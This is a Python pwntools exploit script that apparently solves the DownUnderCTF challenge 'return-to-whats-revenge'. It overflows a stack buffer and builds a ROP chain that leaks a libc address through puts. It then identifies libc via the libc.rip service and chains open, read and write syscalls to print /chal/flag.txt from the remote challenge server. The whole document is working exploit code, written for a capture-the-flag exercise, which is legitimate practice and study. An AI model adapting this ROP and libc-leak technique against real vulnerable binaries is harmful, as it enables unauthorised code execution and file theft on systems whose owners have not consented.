#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./return-to-whats-revenge_noalarm')
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	p = remote('chal.duc.tf', 30006)

# 1st pass: leak libc
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x38 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('Where would you like to return to?\n',payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
if not 'libc' in locals():
	try:
		import requests
		r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
		libc_url = r.json()[0]['download_url']
		libc_file = libc_url.split('/')[-1:][0]
		if not os.path.exists(libc_file):
			log.info('getting: ' + libc_url)
			r = requests.get(libc_url, allow_redirects=True)
			open(libc_file,'wb').write(r.content)
	except:
		log.critical('get libc yourself!')
		sys.exit(0)
	libc = ELF(libc_file)
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

# 2nd pass: get flag
def syscall(rax=None,rdi=None,rsi=None,rdx=None,r10=None,r9=None,r8=None):
	assert(rax != None)
	payload = b''
	if rdi != None: payload += p64(pop_rdi) + p64(rdi)
	if rsi != None: payload += p64(pop_rsi) + p64(rsi)
	if rdx != None: payload += p64(pop_rdx) + p64(rdx)
	if r10 != None: payload += p64(pop_r10) + p64(r10)
	return payload + p64(pop_rax) + p64(rax) + p64(sys_ret)

try:
	rop = ROP([binary,libc])
	pop_rax = rop.find_gadget(['pop rax','ret'])[0]
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
	pop_rsi = rop.find_gadget(['pop rsi','ret'])[0]
	pop_rdx = list(libc.search(asm('pop rdx; ret')))[0]
	pop_r10 = list(libc.search(asm('pop r10; ret')))[0]
	sys_ret = list(libc.search(asm('syscall; ret')))[0]
except:
	log.info('no ROP for you!')
	sys.exit(0)

flagfile = '/chal/flag.txt'
filesize = 100 # guess?

fd = 3
payload  = 0x38 * b'A'
payload += syscall(constants.SYS_read.real,constants.STDIN_FILENO.real,binary.bss()+0x30,len(flagfile))
payload += syscall(constants.SYS_open.real,binary.bss()+0x30,0,0)
payload += syscall(constants.SYS_read.real,fd,binary.bss()+0x40,filesize)
payload += syscall(constants.SYS_write.real,constants.STDOUT_FILENO.real,binary.bss()+0x40,filesize)

p.sendlineafter('Where would you like to return to?\n',payload)
p.send(flagfile)
log.info(p.recv(filesize).split(b'\n')[0])

